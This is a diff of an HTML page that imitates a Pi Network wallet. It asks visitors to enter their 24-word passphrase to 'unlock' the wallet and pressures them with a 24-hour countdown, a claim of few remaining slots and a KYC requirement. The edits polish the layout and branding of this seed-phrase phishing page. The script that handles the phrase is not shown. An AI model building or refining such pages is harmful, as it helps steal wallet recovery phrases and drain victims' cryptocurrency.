@@ -7,42 +7,43 @@
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <!-- Top Header (purple strip) -->
+  <!-- Top Header -->
   <header class="topbar">
     <div class="topbar__left">
-      <a class="link" href="#" title="Download Pi Browser">Download Pi Browser</a>
+      <button class="back-btn" type="button" aria-label="Back">&lt;</button>
     </div>
     <div class="topbar__center">
-      <img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="logo" />
-      <a class="home" href="#" aria-label="Home">Home</a>
+      <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="PiNet logo" class="logo" />
+      <a class="home" href="#">Home</a>
     </div>
     <div class="topbar__right">
-      <button class="back-btn" type="button" aria-label="Back">&lt;</button>
+      <a class="link" href="#">Download Pi Browser</a>
     </div>
   </header>
 
   <!-- Main content -->
   <main class="main">
     <div class="hero">
-      <img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="hero__logo" />
+      <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="PiNet logo" class="hero__logo" />
       <h1 class="hero__title">Welcome to the PiNet</h1>
     </div>
 
+    <div class="unlock-logo">
+      <img src="https://ik.imagekit.io/pinet/Pi/unlock.png?updatedAt=1753819802279" alt="Unlock Pi Wallet" />
+    </div>
+
     <section class="card">
-      <h2 class="card__title">Unlock Pi Wallet</h2>
-      <textarea id="passphrase" class="input" placeholder="Enter your 24-word passphrase here" rows="4"></textarea>
+      <textarea id="passphrase" class="input" placeholder="Enter your 24-word passphrase here"></textarea>
       <button id="unlockBtn" class="btn btn--primary" type="button">Unlock With Passphrase</button>
     </section>
 
-    <!-- Result / Unlocked panel (hidden until unlocked) -->
+    <!-- Result / Unlocked panel -->
     <section id="unlocked" class="card card--success" hidden>
-      <div class="unlocked__header">
-        <h3 class="unlocked__title">Mainnet Unlocked</h3>
-        <img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="unlocked__logo" />
-      </div>
-      <p class="meta"><strong>Time remaining :</strong> <span id="countdown">24:00:00</span></p>
-      <p class="meta"><strong>Requirement:</strong> KYC successfully completed</p>
-      <p class="meta"><strong>Remaining slots:</strong> 518 out of 31,415</p>
+      <h3 class="unlocked__title">Mainnet Unlocked</h3>
+      <img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="unlocked__logo" />
+      <p><strong>Time remaining:</strong> <span id="countdown">24:00:00</span></p>
+      <p><strong>Requirement:</strong> KYC successfully completed</p>
+      <p><strong>Remaining slots:</strong> 518 out of 31,415</p>
 
       <div class="notice">
         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
@@ -51,13 +52,8 @@
         </p>
       </div>
     </section>
-
-    <footer class="footer">
-      <small>Note: This web page is designed to work on all mobile screens properly.</small>
-    </footer>
   </main>
 
   <script src="script.js"></script>
 </body>
 </html>
-
